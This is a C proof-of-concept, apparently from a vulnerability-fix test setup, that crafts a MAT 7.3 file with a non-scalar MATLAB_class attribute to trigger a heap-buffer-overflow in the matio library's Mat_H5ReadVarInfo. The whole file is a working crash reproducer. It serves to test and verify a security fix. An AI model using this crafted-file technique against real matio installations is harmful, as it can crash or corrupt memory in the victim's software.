/*
 * Residual-overflow PoC for the MATLAB_class attribute read in src/mat73.c.
 *
 * Builds a valid MAT 7.3 (HDF5) file whose root dataset carries a MATLAB_class
 * attribute that is a *non-scalar* (2-element) fixed-length string array, then
 * reads it back through the public matio API (Mat_Open + Mat_VarReadNext).
 *
 * Mat_H5ReadVarInfo sizes the read buffer for a single element
 * (calloc(class_len + 1)) but reads the whole attribute with H5Aread, so a
 * 2-element attribute writes 2 * (class_len + 1) bytes into a (class_len + 1)
 * buffer -> heap-buffer-overflow (AddressSanitizer).
 *
 * Build (paths depend on where matio + hdf5 are installed), e.g.:
 *   cc -fsanitize=address -g -I<matio_include> -I<hdf5_include> \
 *      pocs/residual.c -o /tmp/residual \
 *      -L<matio_lib> -L<hdf5_lib> -lmatio -lhdf5 -lz
 *   /tmp/residual /tmp/crafted.mat
 */
#include <hdf5.h>
#include <matio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int
make_crafted(const char *path)
{
    hid_t fcpl, fid, dspace, dset, atype, aspace, attr;
    hsize_t ddims[1] = {1};
    hsize_t adims[1] = {2};
    double value = 0.0;
    char attr_buf[14];
    char header[116];
    char subsys[8];
    short version = 0x0200;
    short endian = 0x4d49; /* "IM" on little-endian, matches libmatio */
    FILE *fp;

    /* HDF5 file with a 512-byte user block, exactly like a MAT 7.3 file. */
    fcpl = H5Pcreate(H5P_FILE_CREATE);
    H5Pset_userblock(fcpl, 512);
    fid = H5Fcreate(path, H5F_ACC_TRUNC, fcpl, H5P_DEFAULT);
    H5Pclose(fcpl);
    if ( fid < 0 )
        return -1;

    /* A plain root dataset so the top-level iterator visits it. */
    dspace = H5Screate_simple(1, ddims, NULL);
    dset = H5Dcreate(fid, "x", H5T_IEEE_F64LE, dspace, H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT);
    H5Dwrite(dset, H5T_NATIVE_DOUBLE, H5S_ALL, H5S_ALL, H5P_DEFAULT, &value);
    H5Sclose(dspace);

    /* MATLAB_class: fixed-length string, element size 7 ("double"+NUL), but a
     * 2-element (non-scalar) array rather than the expected scalar. */
    atype = H5Tcopy(H5T_C_S1);
    H5Tset_size(atype, 7);
    H5Tset_strpad(atype, H5T_STR_NULLTERM);
    aspace = H5Screate_simple(1, adims, NULL);
    attr = H5Acreate(dset, "MATLAB_class", atype, aspace, H5P_DEFAULT, H5P_DEFAULT);
    memset(attr_buf, 0, sizeof(attr_buf));
    memcpy(attr_buf + 0, "double", 6);
    memcpy(attr_buf + 7, "double", 6);
    H5Awrite(attr, atype, attr_buf);
    H5Aclose(attr);
    H5Sclose(aspace);
    H5Tclose(atype);

    H5Dclose(dset);
    H5Fclose(fid);

    /* Write the MAT 7.3 header into the user block so Mat_Open detects v7.3. */
    fp = fopen(path, "r+b");
    if ( NULL == fp )
        return -1;
    memset(header, ' ', sizeof(header));
    memcpy(header, "MATLAB 7.3 MAT-file, Platform: PoC", 34);
    memset(subsys, ' ', sizeof(subsys));
    (void)fseek(fp, 0, SEEK_SET);
    fwrite(header, 1, sizeof(header), fp);
    fwrite(subsys, 1, sizeof(subsys), fp);
    fwrite(&version, 2, 1, fp);
    fwrite(&endian, 2, 1, fp);
    fclose(fp);

    return 0;
}

int
main(int argc, char **argv)
{
    const char *path = argc > 1 ? argv[1] : "/tmp/crafted.mat";
    mat_t *mat;
    matvar_t *matvar;

    if ( make_crafted(path) != 0 ) {
        fprintf(stderr, "failed to create crafted file\n");
        return 2;
    }

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( NULL == mat ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 2;
    }

    /* On the shipped tree this reads the non-scalar MATLAB_class attribute and
     * overflows class_str inside Mat_H5ReadVarInfo. On the golden tree the
     * scalar-extent check in Mat_H5ReadScalarAttribute rejects the attribute
     * and this returns NULL cleanly. */
    matvar = Mat_VarReadNext(mat);
    if ( NULL != matvar )
        Mat_VarFree(matvar);

    Mat_Close(mat);
    return 0;
}
